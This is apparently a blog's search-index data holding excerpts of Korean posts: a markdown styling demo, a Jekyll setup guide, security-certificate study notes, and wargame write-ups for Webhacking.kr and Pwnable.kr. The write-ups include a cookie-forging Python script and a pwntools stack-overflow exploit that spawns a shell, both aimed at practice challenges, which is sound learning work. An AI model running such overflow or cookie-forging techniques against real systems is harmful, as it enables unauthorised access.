Text](#link){: .btn .btn--warning}[Danger Button Text](#link){: .btn .btn--danger}[Info Button Text](#link){: .btn .btn--info}[Inverse Button](#link){: .btn .btn--inverse}[Light Outline Button](#link){: .btn .btn--light-outline}X-Large ButtonLarge ButtonDefault ButtonSmall Button [X-Large Button](#link){: .btn .btn--primary .btn--x-large}[Large Button](#link){: .btn .btn--primary .btn--large}[Default Button](#link){: .btn .btn--primary }[Small Button](#link){: .btn .btn--primary .btn--small}Notice **Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice}` class.{: .notice}**Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice--primary}` class.{: .notice--primary}**Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice--info}` class.{: .notice--info}**Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice--warning}` class.{: .notice--warning}**Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice--success}` class.{: .notice--success}**Watch out!** This paragraph of text has been [emphasized](#) with the `{: .notice--danger}` class.{: .notice--danger}{% capture notice-text %} You can also add the .notice class to a div element.* Bullet point 1* Bullet point 2{% endcapture %}&lt;div class=\"notice--info\"&gt;  &lt;h4&gt;Notice Headline:&lt;/h4&gt;  {{ notice-text | markdownify }} &lt;/div&gt;Watch out! This paragraph of text has been emphasized with the {: .notice} class. Watch out! This paragraph of text has been emphasized with the {: .notice--primary} class. Watch out! This paragraph of text has been emphasized with the {: .notice--info} class. Watch out! This paragraph of text has been emphasized with the {: .notice--warning} class. Watch out! This paragraph of text has been emphasized with the {: .notice--success} class. Watch out! This paragraph of text has been emphasized with the {: .notice--danger} class.   Notice Headline:   You can also add the .notice class to a &lt;div&gt; element.   Bullet point 1  Bullet point 2정의   사과 나무  사과나무는 장미목 장미과 배나무아과 사과나무속에 딸린 종이다. 4월에서 5월 사이에 꽃을 피운다. 열매는 8~9월에 꽃받침이 자라면서 녹색 또는 붉은색으로 생긴다. 70~100여 년간 살고 경제적 가치가 있는 열매를 생산하는 시기는 40~50살 쯤이다. 그 열매는 사과라 하며, 세계적으로 가장 널리 재배되는 과일 품종 가운데 하나이다. 평과라고도 한다.수평선 --- (축)약어 HTML은 하이퍼텍스트 마크업 언어(HyperText Markup Language, 문화어: 초본문표식달기언어, 하이퍼본문표식달기언어)라는 의미의 웹 페이지를 위한 지배적인 마크업 언어다.*[HTML]: HyperText Markup LanguageHTML은 하이퍼텍스트 마크업 언어(HyperText Markup Language, 문화어: 초본문표식달기언어, 하이퍼본문표식달기언어)라는 의미의 웹 페이지를 위한 지배적인 마크업 언어다. 주석 {::comment}이곳은 표시되지 않습니다.{:/comment}{::comment}이곳 또한 표시되지 않습니다.{:/} 각주 페이지 최하단에 표시되어집니다. 각주1 1, 각주2 2             각주 내용 1 &#8617;               각주 내용 2 &#8617;       ","categories": ["blogging"],
        "tags": ["jekyll","markdown","kramdown"],
        "url": "https://imreplay.com/blogging/Elements/",
        "teaser":null},{
        "title": "블로그 개발 환경 구축 정리",
        "excerpt":"Intro 이번 포스팅에서는 블로그를 운영하는 환경에 대해 포스팅 해보려고 합니다. 기본적인 것들 먼저 현재 이 블로그는 Github.io와 jekyll을 기반으로 합니다. 테마는 minimal-mistake 테마를 사용하고 있으며, travis-ci를 통해 Github에 Push 되었을 경우 아래의 과정을 자동으로 수행합니다. Clone(저장소를 복제) -&gt; build(정적 사이트 생성) -&gt; Algolia에 검색 데이터 업데이트 -&gt; Deploy(gh-pages 브랜치에 Push)디렉토리 구조 현재 제가 구축한 페이지의 전반적인 구조입니다. _data #다양한 데이터 파일 존재 ㄴ navigation.yml # 네비게이션바, 사이드바 등이 정의 되어있음 ㄴ ui-text.yml # 언어별 표시되는 단어들에 대한 설정 _drafts # 포스팅 초안이 저장되는 곳이며 jekyll serve 명령에도 포스트가 생성되지 않음_includes # include 를 사용하여 가져올수 있는 파일들 (사실 너무 많아서 다 못봄..)_layouts # 사이트의 전체적인 레이아웃부터 부분부분에 대한 레이아웃을 설정해주는 부분_posts # 포스팅 작성용도 ㄴ blogging #블로그 만드는 과정 정리 _pages #404 페이지, about 페이지 등이 있음_sass #css 파일들이 저장되어있는부분_assets # 이미지, js파일을 보관하는 용도로 사용files # 파일들을 올려두고 필요할때 다운받으려고 만들어둔 폴더, 포스팅과는 크게 관계 없음.구름 IDE 기존까지의 개발환경은 Git 저장소를 매번 Clone 해서 Visual Studio Code 를 통해 수정 후 Push 하는 방식이었으나, 며칠전 불편함을 느끼고 구름 IDE로 변경하였습니다. 구름 IDE 개발 환경은 다음과 같습니다.   Ruby 빈 프로젝트 사용  Free 요금 plan 사용  구름 IDE에서 제공하는 URL을 통해 테스트 서버 구동 및 확인jekyll 환경 구축 구름 IDE에 Ruby 빈 프로젝트를 사용하여 jekyll을 구동할 환경을 설정해 주었습니다. gem install bundlergem install jekyllbundle instll# 테스트 서버 구동bundle exec jekyll serve --host 0.0.0.0 --port 80# 초안(_draft/ 안의 파일)포함하여 보기bundle exec jekyll serve --host 0.0.0.0 --port 80 --draftGist 아직까지 한번도 사용된 적이 없지만 Gist1 또한 사용할 예정입니다. jekyll-gist 라는 플러그인을 통해 {% gist imreplay/fddf777205fc2202fb66b0260ca22b7e %}위와 같이 사용하면 다음과 같은 결과를 확인할 수 있습니다. print(&quot;hello gist!!&quot;)검색 및 댓글 서비스 검색 서비스는 Algolia라는 서비스를 사용하고 있습니다. 설정 방법에 관하여는 이 곳 참조 댓글 서비스는 disqus를 사용하고 있습니다. 위 두가지 서비스 모두 _config.yml파일 안에서 설정할 수 있습니다. 포스팅 과정       초안작성         테스트 서버 구동 후 오탈자 확인 및 수정         포스팅 완료 후 _posts 디렉토리로 이동         커밋 후 Push         업데이트 된 포스팅 확인 및 오탈자 재 확인         수정 필요시 지속 수정   Outtro 이 포스팅은 처음으로 구름 IDE로 써보는데 신세계입니다.. 와우…             gist.github.com, 간단한 코드 조각들을 공유할 수 있는 플랫폼 &#8617;       ","categories": ["blogging"],
        "tags": ["jekyll"],
        "url": "https://imreplay.com/blogging/%EB%B8%94%EB%A1%9C%EA%B7%B8-%ED%99%98%EA%B2%BD-%EA%B5%AC%EC%B6%95/",
        "teaser":null},{
        "title": "[Webhacking.kr] 6번(100) 문제 풀이",
        "excerpt":"천천히 쉬운문제부터 시작하기로 생각하고 안풀었던 문제부터 풀기 시작했다. 처음 문제 페이지에 접속했을때 다음과 같은 화면을 볼 수 있다.  문제에서 제공하는 index.phps 의 소스코드를 확인 할 수 있다. &lt;?php if(!$_COOKIE[user]) {     $val_id=\"guest\";     $val_pw=\"123qwe\";     for($i=0;$i&lt;20;$i++)     {         $val_id=base64_encode($val_id);         $val_pw=base64_encode($val_pw);     }     $val_id=str_replace(\"1\",\"!\",$val_id);     $val_id=str_replace(\"2\",\"@\",$val_id);     $val_id=str_replace(\"3\",\"$\",$val_id);     $val_id=str_replace(\"4\",\"^\",$val_id);     $val_id=str_replace(\"5\",\"&amp;\",$val_id);     $val_id=str_replace(\"6\",\"*\",$val_id);     $val_id=str_replace(\"7\",\"(\",$val_id);     $val_id=str_replace(\"8\",\")\",$val_id);     $val_pw=str_replace(\"1\",\"!\",$val_pw);     $val_pw=str_replace(\"2\",\"@\",$val_pw);     $val_pw=str_replace(\"3\",\"$\",$val_pw);     $val_pw=str_replace(\"4\",\"^\",$val_pw);     $val_pw=str_replace(\"5\",\"&amp;\",$val_pw);     $val_pw=str_replace(\"6\",\"*\",$val_pw);     $val_pw=str_replace(\"7\",\"(\",$val_pw);     $val_pw=str_replace(\"8\",\")\",$val_pw);     Setcookie(\"user\",$val_id);     Setcookie(\"password\",$val_pw);     echo(\"&lt;meta http-equiv=refresh content=0&gt;\"); } ?&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Challenge 6&lt;/title&gt; &lt;style type=\"text/css\"&gt; body { background:black; color:white; font-size:10pt; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;? $decode_id=$_COOKIE[user]; $decode_pw=$_COOKIE[password]; $decode_id=str_replace(\"!\",\"1\",$decode_id); $decode_id=str_replace(\"@\",\"2\",$decode_id); $decode_id=str_replace(\"$\",\"3\",$decode_id); $decode_id=str_replace(\"^\",\"4\",$decode_id); $decode_id=str_replace(\"&amp;\",\"5\",$decode_id); $decode_id=str_replace(\"*\",\"6\",$decode_id); $decode_id=str_replace(\"(\",\"7\",$decode_id); $decode_id=str_replace(\")\",\"8\",$decode_id); $decode_pw=str_replace(\"!\",\"1\",$decode_pw); $decode_pw=str_replace(\"@\",\"2\",$decode_pw); $decode_pw=str_replace(\"$\",\"3\",$decode_pw); $decode_pw=str_replace(\"^\",\"4\",$decode_pw); $decode_pw=str_replace(\"&amp;\",\"5\",$decode_pw); $decode_pw=str_replace(\"*\",\"6\",$decode_pw); $decode_pw=str_replace(\"(\",\"7\",$decode_pw); $decode_pw=str_replace(\")\",\"8\",$decode_pw); for($i=0;$i&lt;20;$i++) {     $decode_id=base64_decode($decode_id);     $decode_pw=base64_decode($decode_pw); } echo(\"&lt;font style=background:silver;color:black&gt;&amp;nbsp;&amp;nbsp;HINT : base64&amp;nbsp;&amp;nbsp;&lt;/font&gt;&lt;hr&gt;&lt;a href=index.phps style=color:yellow;&gt;index.phps&lt;/a&gt;&lt;br&gt;&lt;br&gt;\"); echo(\"ID : $decode_id&lt;br&gt;PW : $decode_pw&lt;hr&gt;\"); if($decode_id==\"admin\" &amp;&amp; $decode_pw==\"admin\") {     @solve(6,100); } ?&gt; &lt;/body&gt; &lt;/html&gt; 특수 &lt;-&gt; 문자숫자 간에 치환을 하며, base64 로 20번 디코딩했을때 id와 pw가 admin 이면 풀릴것 같다. 위 과정과 반대로 admin 을 base64로 20번 인코딩 후 숫자를 특수문자로 바꾸어 주면 될 것 같으니 해보자. id, pw는 cookie 를 통해 전달하는데 파이썬으로 다음과 같이 풀이하였다. import base64import base64import requestsimport urllib.parse# 인코딩def en_b64_20(d_data):  rep = &quot;! @ $ ^ &amp; * ( )&quot;.split(&#39; &#39;)  for i in range(0,20):    d_data = base64.b64encode(d_data)  d_data = d_data.decode()  for num,ch in enumerate(rep):    d_data = d_data.replace(str(num+1),ch)  return d_dataid_pw = &quot;admin&quot;.encode()e_id_pw = urllib.parse.quote_plus(en_b64_20(id_pw))url = &#39;http://webhacking.kr/challenge/web/web-06/index.php&#39;session_id = input(&#39;PHPSESSID plese : &#39;) cookies = {&#39;PHPSESSID&#39;:session_id,&#39;user&#39;:e_id_pw,&#39;password&#39;:e_id_pw}res = requests.get(url,cookies=cookies)print(res.text)파이썬 코드를 통해 웹 요청을 보내는 방법이라서 PHPSESSID 를 입력받아 진행하였다. 문제를 풀이하면 결과 페이지가 html로 출력되는데 잘 읽어보면 풀렸다고 나온다! ","categories": ["Wargame"],
        "tags": ["web","webhackinag.kr"],
        "url": "https://imreplay.com/wargame/Webhacking-kr-06/",
        "teaser":null},{
        "title": "[Webhacking.kr] 14번(100) 문제 풀이",
        "excerpt":"문제를 보면 입력박스 한개, 체크버튼 한개가 보인다. 소스코드를 확인해 보자. 그렇게 길지 않아서 전문을 첨부하였다. &lt;html&gt;&lt;head&gt;&lt;title&gt;Challenge 14&lt;/title&gt;&lt;style type=\"text/css\"&gt;body { background:black; color:white; font-size:10pt; }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;br&gt;&lt;br&gt;&lt;form name=pw&gt;&lt;input type=text name=input_pwd&gt;&lt;input type=button value=\"check\" onclick=ck()&gt;&lt;/form&gt;&lt;script&gt;function ck(){var ul=document.URL;ul=ul.indexOf(\".kr\");ul=ul*30;if(ul==pw.input_pwd.value) { alert(\"Password is \"+ul*pw.input_pwd.value); }else { alert(\"Wrong\"); }}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;여기서 주의깊게 봐야할 곳은 이부분이다. &lt;script&gt;function ck(){var ul=document.URL;ul=ul.indexOf(\".kr\");ul=ul*30;if(ul==pw.input_pwd.value) { alert(\"Password is \"+ul*pw.input_pwd.value); }else { alert(\"Wrong\"); }}&lt;/script&gt;ul에 document.URL을 저장한다. 그 후 ul에서 \".kr\"의 위치를 찾아 인덱스를 저장한다. 다음으로 그 값에 30을 곱하고, 제출한 값과 일치하면 성공! alert으로 ul과 입력한 값을 곱한것이 패스워드 일 것이다. 직접 계산하긴 귀찮으니 저 코드를 콘솔에 실행시켜보자. var ul=document.URL;ul=ul.indexOf(\".kr\");ul=ul*30;# 출력부분 추가console.log(ul);마지막에 console.log(ul) 을 추가해서 비교 전 ul의 값을 확인하였다. 결과값을 보니 510 이다. if(ul==pw.input_pwd.value) { alert(\"Password is \"+ul*pw.input_pwd.value); } 부분에서 ul 과 패스워드로 입력한 값이 같을 때 ul을 입력값과 곱한다고 했는데 생각해보니 ul * ul 이다. 510의 제곱 값을 Auth 부분에 입력 후 문제 풀이 끝 ","categories": ["Wargame"],
        "tags": ["web","webhackinag.kr"],
        "url": "https://imreplay.com/wargame/Webhacking-kr-14/",
        "teaser":null},{
        "title": "[Webhacking.kr] 16번(100) 문제 풀이",
        "excerpt":"*…? 소스를 봐야할 것 같다. 이번엔 스크립트부분만 살펴보자 &lt;script&gt; document.body.innerHTML+=\"&lt;font color=yellow id=aa style=position:relative;left:0;top:0&gt;*&lt;/font&gt;\";function mv(cd){kk(star.style.posLeft-50,star.style.posTop-50);if(cd==100) star.style.posLeft=star.style.posLeft+50;if(cd==97) star.style.posLeft=star.style.posLeft-50;if(cd==119) star.style.posTop=star.style.posTop-50;if(cd==115) star.style.posTop=star.style.posTop+50;if(cd==124) location.href=String.fromCharCode(cd);}function kk(x,y){rndc=Math.floor(Math.random()*9000000);document.body.innerHTML+=\"&lt;font color=#\"+rndc+\" id=aa style=position:relative;left:\"+x+\";top:\"+y+\" onmouseover=this.innerHTML=''&gt;*&lt;/font&gt;\";}&lt;/script&gt;cd == 124 일때 특정 링크로 이동하는 것 같다. 콘솔에 String.fromCharCode(124) 를 입력해보면 | 문자열이 출력된다. 문제 화면에서 | 를 입력하면 끝! ","categories": ["Wargame"],
        "tags": ["web","webhackinag.kr"],
        "url": "https://imreplay.com/wargame/Webhacking-kr-16/",
        "teaser":null},{
        "title": "[Pwnable.kr] Toddler's Bottle - fd 풀이",
        "excerpt":"문제 fd.c #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[]){        if(argc&lt;2){                printf(\"pass argv[1] a number\\n\");                return 0;        }        int fd = atoi( argv[1] ) - 0x1234;        int len = 0;        len = read(fd, buf, 32);        if(!strcmp(\"LETMEWIN\\n\", buf)){                printf(\"good job :)\\n\");                system(\"/bin/cat flag\");                exit(0);        }        printf(\"learn about Linux file IO\\n\");        return 0;}먼저 문제 제목인 fd의 의미에 대해 생각해보도록 하자. 아마 ‘파일 디스크럽터’에 대한 문제일 것이다. read 함수를 사용할 때 read(int fd, void *buf, size_t count)위와 같은 형태로 사용한다. fd 의 값은 아래 표와 같이 결정 되어진다.             fd      처리방법                  0      표준 입력(stdin)              1      표준 출력(stdout)              2      표준 에러(stderr)      문제에서 buf와 \"LETMEWIN\"문자열을 비교하는 부분이 있으므로 fd 값을 0으로 만들어 표준입력으로 값을 입력시켜주어야 한다. 매개변수로 0x1234 == 4660 를 넘겨주고 문자열 LETMEWIN 을 입력해주면 flag 가 나올 것이다! fd@ubuntu:~$ ./fd 4660LETMEWINgood job :){여기에 Flag가 출력됩니다.}python과 pwntools 모듈을 사용하여 풀이 또한 가능하다. fd_payload.py from pwn import *host = &quot;pwnable.kr&quot;user = &quot;fd&quot;password = &quot;guest&quot;port = 2222s = ssh(host=host, user=user, password=password, port=port)fd_run = s.run(&#39;./fd &#39;+str(0x1234))fd_run.sendline(&#39;LETMEWIN&#39;)print fd_run.recvall()s.close()","categories": ["Wargame"],
        "tags": ["system","Pwnable.kr"],
        "url": "https://imreplay.com/wargame/pwnablekr-fd/",
        "teaser":null},{
        "title": "[정보보안산업기사] 정보보호 개요 정리",
        "excerpt":"정보보호 목표 3대 목표는 CIA(기밀성, 무결성, 가용성)             목표      내용                  기밀성(Confidentiality)      인가된 사람,프로세스, 시스템이 알 필요성(Need to know)에 근거하여 시스템에 접근할 수 있다              무결성(Integrity)      정보가 위조/변조/삭제 되지 않도록 보호되어야 한다              가용성(Avilavility)      정당한 사용자가 시스템의 자원을 필요할 때 사용할 수 있어야 한다.              인증(Authentication)      정보에 접근할 수 있는 객체의 자격을 검증하는데 사용된다.              책임추적성(Accountability)      보안 목적에는 개체의 행동을 유일하게 추적해서 찾아낼 수 있어야 한다.              부인방지(Non-repudiation)      행위나 이벤트의 발생을 증명하여 부인할 수 없도록 하는 것.      정보보호 관리와 대책 정보보호 대책은 크게 3가지로 나뉘어 진다.             대책      설명                  기술적 보호대책      정보 시스템, 통신망, 데이터를 보호하기 위한 기본적인 대책. 접근통제, 암호기술, 보안성이 강화된 소프트웨어 등              물리적 보호대책      자연재해로 부터 시설을 보호하기 위한 자연재해 대책, 외부 적으로부터 보호하기위한 시건장치등이 있다.              관리적 보호대책      제도나 법, 교육 등을 확립하고, 보안교육 수립,운영하며 위험 분석및 보안감사를 시행하여 정보시스템의 안정성과 신뢰성을 확보.      보안 목표와 관련된 공격 분류 보안의 세가지 목표는 보안공격에 의해 공격받을 수 있다. 보안 목표(기밀성,무결성,가용성)와 관련된 공격분류   기밀성을 위협하는 공격          스누핑(Snooping) : 데이터에 대한 접근 또는 탈취      트래픽 분석(Traffic analysis) : 트래픽 분석을 통해 정보 획득        무결성을 위협하는 공격          수정(Modification) : 메시지 일부를 불법 수정 또는 전송을 지연시켜 인가되지 않은 효과를 노리는 공격      가장(Masquerading) : 한 개체가 다른 개체의 행새를 하는 것      재연(Replaying) : 획득한 데이터 단위를 보관하고 있다가 시간이 흐른 후 재전송      거부/부인(Repudiation) : 송신자는 보낸것을, 또는 수신자가 받은 것을 부인        가용성을 위협하는 공격          서비스거부공격(Dos) : 시스템의 서비스를 느리게 하거나 접근하지 못하게 하는 방법      소극적 공격과 적극적 공격 보안 공격을 X.800 과 RFC2828dp 따라 두가지로 분류하면 다음과 같다.   소극적 공격          특징 : 정보획득, 사용하려는 목표를 가지며 시스템 자원에는 영향을 끼치지 않는다.      위협하는 보안목표 : 기밀성      공격 종류 : 스누핑, 트래픽 분석 등        적극적 공격          특징 : 정보의 변조, 시스템의 파괴등을 목표로 한다.      위협하는 보안목표 : 무결성, 가용성      공격종류 : 수정, 가장, 재연, 거부, 서비스 거부공격 등      보안 위협분류   자연에 의한 위협          화재 홍수 지진등..      온도계, 무정전시스템, 화재 경보기등을 설치하여 피해를 최소화        인간에 의한 위협          비 의도적 위협                  가장 큰 위협으로 실수, 태만이 원인          패스워드 공유, 백업의 부재 등                    의도적 위협                  바이러스, 해커, 사이버 테러리스트등으로 부터 발생          도청 신분위장에 의한 불법 접근, 정당한 정보데 대한 부인, 악의적 시스템 장애 유발 등                    시점별 통제   예방통제 : 사전에 위협과 취약점을 통제  탐지통제 : 위협을 탐지하는 통제  교정통제 : 탐지된 위협이나 취약점에 대처하거나 위협을 줄이거나 취약점을 감소시키는 통제기본 보안용어 정리   공격자 : 시스템을 공격, 위협하는 존재  공격 : 시스템의 보안 서비스를 피해 보안정책을 위반하려는 의도된 시도  대응 : 피해의 최소화 및 적절한 대응을 위해 탐지, 보고 하여 위험, 노출, 공격을 제거하거나 방지하는 행위, 장비, 기법  위험 : 특정 위협이 가져올 피해가 확률적으로 표현되는 예상 손실  보안정책 : 시스템이나 기관이 민감하고 중요한 시스템 자원들에 보안 서비스를 제공하기 위해 명시한 규정과 업무  자산 : 정보시스템의 데이터, 서비스, 처리 기능, 대역폭, 장비등 시스템 장비 설비  위협 : 보안을 침해하고 손해를 가져올 수 있는 상황, 행위, 이벤트가 존재할 때의 잠재적 보안 위반  취약성 : 시스템 보안 정책을 위반할 수 있는 시스템 설계, 구현 혹은 운영, 관리상의 오류,약점","categories": ["Study"],
        "tags": ["정보보안산업기사"],
        "url": "https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%A0%95%EB%B3%B4%EB%B3%B4%ED%98%B8%EA%B0%9C%EC%9A%94-0711/",
        "teaser":null},{
        "title": "[정보보안산업기사] 암호화 개요 요약",
        "excerpt":"암호학   암호  약속된 당사자 또는 집단에서만 암호문에 내포된 내용을 알수있게 해주는 일종의 문서이다.  암호학  평문을 다른사람이 알아볼 수 없는 형태의 암호문으로 만들고 특정한 비밀키를 아는 사람만 평문으로 복원시킬 수 있도록 하는 암호기술과 이를 제3자가 해독하는 방법을 분석하는 암호해독에 관하여 연구하는 학문.  암호화  평문을 암호문으로 바꾸는 과정  수식으로 표현하면  로 표현할 수 있다.       평문 P를 키 K로 암호화 하여(E) 암호문 C를 얻는다.     복호화  암호문을 평문으로 바꾸는 과정  수식으로 표현하면  로 표현할 수 있다.       암호문 C를 키 K로 복호화 하여(D) 평문 P를 얻는다.   암호기법   치환암호와 전치암호          치환암호 : 비트, 문자의 블록을 다른 비트, 문자 또는 블록으로 치환      전치암호 : 치환암호처럼 대체하지는 않지만, 원문을 이동시키는 방법        블록암호와 스트림암호          블록암호 : 특정 비트수의 집합을 한번에 처리하는 암호      스트림 암호: 한번에 1비트 혹은 1바이트의 데이터 흐름(스트림)을 순차적으로 처리하는 암호알고리즘의 총칭                  평문과 키 스트림을 XOR 하여 생성한다.                      위치에 따른 암호화의 구분          링크 암호화                  모든정보를 암호화함          각 hop에서 해독하여 경로 파악          중간노드에서 해독되기 때문에 평문이 노출될 위험이 있음                    종단간 암호화                  헤더와 트레일러는 암호화 하지 않음          애플리케이션 계층에서 암호화          중간노드에서 데이터가 암호문으로 존재함                      하드웨어와 소프트웨어 암호시스템          하드웨어 암호시스템                  하드웨어로 실현하기 위해 컴퓨터와 통신기기의 내부버스와 외부 인터페이스에 전용 암호처리용 하드웨어를 설치해 데이터 암호화          CPU에 부담을 주지 않고 고속 암호화가 가능                    소프트웨어 암호시스템                  저렴한 비용으로 실현가능          최근 PC의 처리속도 향상으로 소프트웨어에 의한 처리가 주류를 이룸                    주요 암호기술   대칭키 암호 : 암호화키와 복호화 키가 같은 알고리즘 방식          기밀성, 무결성, 인증을 제공        비대칭키 암호 : 암호화키와 복호화 키가 다른 알고리즘 방식          기밀성, 무결성, 인증을 제공        하이브리드 암호시스템 : 대칭키 암호화 비대칭키 암호의 장점을 조합한 방식  일방향 해시(Hash)함수 : 해시함수를 이용하여 계산한값          무결성 제공        메시지 인증코드 : 메시지가 생각했던 통신상대로부터 온 것임을 확인하기 위한 기술          무결성과 인증을 제공        전자 서명 : 도장이나 서명, 날인의 개념을 온라인세계에 적용한 것          무결성, 인증, 부인방지 제공        의사난수 생성기 : 난수열을 생성하는 알고리즘으로 키 생성을 담당  암호학자의 도구상자 : 대칭키 암호, 공개키 암호, 일방향 해시함수, 메시지 인증코드, 전자서명, 의사난수 생성기를 합하여 암호학자의 도구상자라고 한다.디지털 저작권 관리   스테가노그래피 : 파일에 인간이 인지하지 못 할 정도의 미세한 부분에 변화를 주어 정보를 입력한 것  워터마크 : 원본의 내용을 왜곡하지 않는 범위에서 저작권 정보를 디지털 콘텐츠에 삽입하는 기술          강한 워터마킹 : 공격을 받아도 쉽게 파괴, 손상되지 않음      약한 워터마킹 : 공격을 받으면 쉽게 파괴됨        핑거프린팅 : 디지털 콘텐츠를 구매할 때 구매자의 정보를 삽입, 불법 배포시 최초의 배포자를 추적할 수 있게 하는 기술  디지털 저작권 관리 (DRM) : 디지털권리 소유자를 분명히 나타내고 디지털 작품에 대해 약정된 지불액을 받을 수 있도록 하는 시스템 또는 절차          DRM의 구성요소                  메타 데이터 : 콘텐츠 생명주기 범위 내에서 유통되는 컨텐츠의 배포 범위          패키저 : 보호대상 콘텐츠를 메타데이터와 SecureContainer 포맷으로 패키징하는 모듈          시큐어컨테이너(SecureContainer) : DRM의 보호범위 내에서 유통되는 컨텐츠의 배포 단위          식별자 : 컨텐츠를 식별하기 위한 식별자          DRM 제어기 : 컨텐츠를 이용하는 사용자의 단말기에서 컨텐츠가 라이센스에 명시된 범위내에서 지속적으로 보호가능하도록 프로세스를 제어          클리어링하우스 : 디지털 허가를 소비자에게 발급해주고 콘텐츠 제공자에게 로열티 수수료를 지불, 배급자에게는 배급수수료를 지불하는 재정적 거래를 취급                    암호분석(암호해독)   암호분석  제 3자가 암호문으로부터 평문을 찾으려는 시도  암호해독자는 복호화에 필요한 키가 없지만, 평문의 통계적 성질, 암호에 관한 지식, 장비 등 여러 정보를 이용하여 암호문을 통해 평문을 찾아낸다.  암호 해독자는 현재 사용되고 있는 암호방식을 알고있다는 전제 하에 암호해독을 시도하는 것으로 간주하는데 이를 케르히호프의 원리라고 한다. 암호분석의 종류   암호문 단독공격          공격자가 단지 어떤 암호문을 얻어 대응되는 평문과 키를 찾는 방법      공격자는 알고리즘을 알고 있고 암호문을 가로챌 수 있다고 가정한다.      암호 해독자에게는 가장 불리하다.        기지 평문공격(알려진 평문공격)          공격자는 해독하려는 암호문 외에 추가로 여러개의 (평문, 암호문)쌍을 얻는다.      암호문에 대응하는 일부 평문이 사용가능한 상황에서의 공격        선택 평문공격          평문을 선택하면 대응하는 암호문을 얻을 수 있는 상황에서의 공격      알려진 평문공격과 유사하지만, 공격자에게 주어지는 (평문, 암호문)쌍을 공격자가 선택        선택 암호문공격          공격자가 어떤 암호문을 선택하고 그에 대응되는 평문을 얻을 수 있는 상황에서의 공격      선택암호문 공격에 견디는 알고리즘은 강한알고리즘이라고 할 수 있다.      암호알고리즘의 안정성 평가   안정성의 개념          계산적 안정성 : 암호시스템을 공격하기 위해 필요한 계산량이 매우 커 현실적으로 공격할 수 없는경우      무조건적 안정성 : 무한한 계산 능력이 있어도 공격할 수 없는 경우        암호기술 평가 체계          대표적으로 CC(Common Criteria)기반의 정보보호 제품평가가 있다.      암호모듈에 대한 안정성 평가로 가장 널리 참조되는 것은 미국의 NIST가 수행하는 CMVP가 있다.        암호기술 평가 종류          암호알고리즘 평가                  정보보호 제품에 탑재된 암호 알고리즘에 대한 안정성 평가          알고리즘 자체만을 평가하며, 제품/시스템과 독립적으로 평가가 가능                    암호모듈 평가                  암호알고리즘을 이용하여 제공되는 암호서비스에 대한 안정성평가          이론적 안정성과는 별도로 암호서비스 기능을 제공하는 암호모듈의 안정성에 대한 평가                    정보보호제품 평가                  암호모듈을 탑재한 정보보호제품(IPS, IDS등)에 대한 평가                    응용시스템 평가                  각 제품을 상호 연동하여 구성되는 시스템에 대한 안정성 평가                      암호기술 평가 과정          암호알고리즘에 대한 이론적 안정성 평가      검증된 암호모듈에 탑재한 정보보호 제품의 안정성 평가      각각의 제품으로 구성된 응용시스템의 안정성 평가        암호모듈의 안정성 평가(CMVP)          암호기술의 구현 적합성 평가      암호키 운용 및 관리      물리적 보안      ","categories": ["Study"],
        "tags": ["정보보안산업기사"],
        "url": "https://imreplay.com/study/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88%EC%82%B0%EC%97%85%EA%B8%B0%EC%82%AC-%EC%95%94%ED%98%B8%ED%95%99%EA%B0%9C%EC%9A%94-0714/",
        "teaser":null},{
        "title": "[Pwnable.kr] Toddler's Bottle - bof 풀이",
        "excerpt":"문제 bof.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key){        char overflowme[32];        printf(\"overflow me : \");        gets(overflowme);       // smash me!        if(key == 0xcafebabe){                system(\"/bin/sh\");        }        else{                printf(\"Nah..\\n\");        }}int main(int argc, char* argv[]){        func(0xdeadbeef);        return 0;}gets 함수를 통해 문자열을 입력받지만 길이를 체크하지 않는다. key를 0xcafebabe 로 덮어씌우면 해결할 수 있는 문제이다. “a”문자열을 32개부터 한개씩 늘려가며 뒤에 0xcafebabe를 붙이는 방법으로 풀이하였다. 풀이 후 colorama를 사용하는 방법을 알게 되어 해당 방법으로 하이라이팅도 해보았다. bof_payload.py from pwn import *import struct# 리틀엔디언을 위한 LE 축약함수 정의LE = lambda x : struct.pack(&quot;&lt;L&quot; , x)key = LE(0xcafebabe)# 32를 시작으로 i의 값을 증가시켜 &quot;a&quot;의 개수를 늘리면서 시도for i in range(32,60):  r = remote(&#39;pwnable.kr&#39;, 9000)  r.sendline(&quot;a&quot;*i+key)    res = r.recv(1024, timeout=1)  # 조건문이 참이면 print문 없이 쉘을 실행하므로  if res == &quot;&quot;:    print &quot;Find!!&quot;, i    r.sendline(&quot;cat flag\\n&quot;)    print r.recv(1024)    break  else:    pass  r.close()두번째 파일의 실행결과는 다음과 같다.  ","categories": ["Wargame"],
        "tags": ["system","Pwnable.kr"],
        "url": "https://imreplay.com/wargame/pwnablekr-bof/",
        "teaser":null},{
        "title": "[Pwnable.kr] Toddler's Bottle - collision 풀이",
        "excerpt":"문제 col.c #include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p){        int* ip = (int*)p;        int i;        int res=0;        for(i=0; i&lt;5; i++){                res += ip[i];        }        return res;}int main(int argc, char* argv[]){        if(argc&lt;2){                printf(\"usage : %s [passcode]\\n\", argv[0]);                return 0;        }        if(strlen(argv[1]) != 20){                printf(\"passcode length should be 20 bytes\\n\");                return 0;        }        if(hashcode == check_password( argv[1] )){                system(\"/bin/cat flag\");                return 0;        }        else                printf(\"wrong passcode.\\n\");        return 0;}코드 흐름을 살펴보면 20바이트 입력을 argv로 받은 후 hashcode와 check_password(argv[1]) 값이 같으면 flag를 보여준다 check_password는 20바이트 입력받은 문자열을 4바이트씩 int로 읽어들여 res에 5번 더한 후 res를 반환해 